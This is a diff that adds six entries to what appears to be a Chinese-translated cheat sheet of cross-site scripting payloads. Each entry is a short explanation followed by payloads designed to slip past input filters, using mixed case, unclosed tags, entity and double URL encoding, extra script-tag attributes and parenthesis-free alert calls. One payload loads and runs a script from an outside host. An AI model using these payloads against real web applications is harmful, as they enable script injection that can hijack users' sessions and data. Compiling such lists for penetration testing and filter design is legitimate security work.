@@ -210,7 +210,40 @@ new(Notification)(1)
 ```
 $ curl -H "Vulnerable_Header: <XSS>" TARGET/?dummy_string
 ```
-****
+**34.Mixed Case（大小写混合）** <br>
+该payload用于绕过区分大小写的xss过滤器。<br>
+```
+<Svg OnLoad=alert(1)>
+<Script>alert(1)</Script>
+```
+**35.Unclosed Tags（未闭合标签）** <br>
+该payload在HTML注入中使用，可避免同时存在小于`（<）`和大于`（>）`符号的情况。<br>
+```
+<svg onload=alert(1)//
+<svg onload="alert(1)"
+```
+**36.Uppercase XSS (大写 XSS)** <br>
+当web应用以大写形式返回用户的输入时使用该payload。 URL中将"＆"替换为"％26"，将"＃"替换为"％23"。<br>
+```
+<SVG ONLOAD=&#97&#108&#101&#114&#116(1)>
+<SCRIPT SRC=//BRUTELOGIC.COM.BR/1></SCRIPT>
+```
+**37.Extra Content for Script Tags (脚本标签的额外内容)** <br>
+当web应用过滤器查找带有某些变体的`"<script>"`或`"<script src = ..."`但不检查其他属性时使用该payload。<br>
+```
+<script/x>alert(1)</script>  
+```
+**38.Double Encoded XSS (双重编码的XSS)** <br>
+当web应用程序对用户输入的内容执行双重解码时使用该payload。<br>
+```
+%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E
+%2522%253E%253Csvg%2520o%256Eload%253Dalert%25281%2529%253E
+```
+**39.Alert without Parentheses (Strings Only) (没有括号的弹窗（仅字符串）)** <br>
+当web应用不允许使用括号并且常规的alert可以使用时，可在HTML向量或javascript注入payload进行使用。
+```
+alert`1`
+```
 
 ## 致谢
 **英文议题作者：** <br>
